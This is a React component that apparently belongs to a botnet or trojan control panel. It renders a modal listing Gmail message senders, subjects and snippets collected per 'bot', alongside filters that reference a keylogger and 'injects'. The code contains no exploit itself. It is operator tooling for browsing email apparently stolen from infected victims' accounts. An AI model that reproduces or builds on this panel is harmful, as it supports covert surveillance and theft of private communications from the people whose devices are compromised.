import React, {useLayoutEffect, useRef} from "react";
import {ModalsProps} from "../../../Model/Modal";
import {Button, Modal, Table} from "antd";
import {Bot} from "../../../Model/Bot";
import {useDispatch, useSelector} from "react-redux";
import {AppState} from "../../../Store/RootReducer";
import {getLogsList} from "../../../Store/Logs/Actions";

interface GmailTitlesLog {
    i: number,
    sender: string,
    snippet: string,
    subject: string,
}

interface GmailTitlesProps extends ModalsProps {
    bot: Bot,
}

const GmailTitles: React.FC<GmailTitlesProps> = (props: GmailTitlesProps) => {
    const dispatch = useDispatch();
    const logsReducer = useSelector((state: AppState) => state.logs);
    const tableRef = useRef<HTMLDivElement>(null);

    useLayoutEffect(() => {
        if (props.visible) {
            dispatch(getLogsList("gmail_mes", props.bot.id, null, logsReducer.filters, logsReducer.sort, logsReducer.page, logsReducer.per_page));
        }
    }, [dispatch, props.bot.id, props.visible, logsReducer.page, logsReducer.per_page, logsReducer.filters.keyloggerAction]);


    const closeModal = () => {
        props.setVisible(false);
    };

    const columns = [
        {
            title: "i",
            dataIndex: "i",
            key: "i",
            render: (text: string, log: GmailTitlesLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>i</b>
                    </div>
                    <div className="table-col-item">
                        {log.i}
                    </div>
                </div>
            ),
        },
        {
            title: "Sender",
            dataIndex: "sender",
            key: "sender",
            render: (text: string, log: GmailTitlesLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>Sender</b>
                    </div>
                    <div className="table-col-item">
                        {log.sender}
                    </div>
                </div>
            ),
        },
        {
            title: "Snippet",
            dataIndex: "snippet",
            key: "snippet",
            render: (text: string, log: GmailTitlesLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>Snippet</b>
                    </div>
                    <div className="table-col-item">
                        {log.snippet}
                    </div>
                </div>
            ),
        },
        {
            title: "Subject",
            dataIndex: "subject",
            key: "subject",
            render: (text: string, log: GmailTitlesLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>Subject</b>
                    </div>
                    <div className="table-col-item">
                        {log.subject}
                    </div>
                </div>
            ),
        },
    ];

    let dataSource: GmailTitlesLog[];

    if (logsReducer.logs.length > 0) {
        dataSource = (logsReducer.logs[0].log) as unknown as GmailTitlesLog[];
    } else {
        dataSource = [];
    }

    const isLoaded = logsReducer.isLoaded && logsReducer.type === "gmail_mes" && logsReducer.botId === props.bot.id;

    return (
        <Modal
            title="GmailTitles logs"
            className="modal-injects"
            visible={props.visible}
            onCancel={closeModal}
            width={600}
            destroyOnClose
            footer={[
                <>
                    <Button
                        type="primary"
                        onClick={closeModal}
                        danger
                    >
                        Close
                    </Button>
                </>,
            ]}
        >
            <div className="table-scroll" style={{maxHeight: 600, overflowY: "auto"}} ref={tableRef}>
                <Table
                    columns={columns}
                    dataSource={isLoaded ? dataSource : []}
                    size="small"
                    pagination={false}
                    sticky={true}
                    className="not-responsive"
                    loading={!isLoaded}
                />
            </div>
        </Modal>
    );
};

export default GmailTitles;
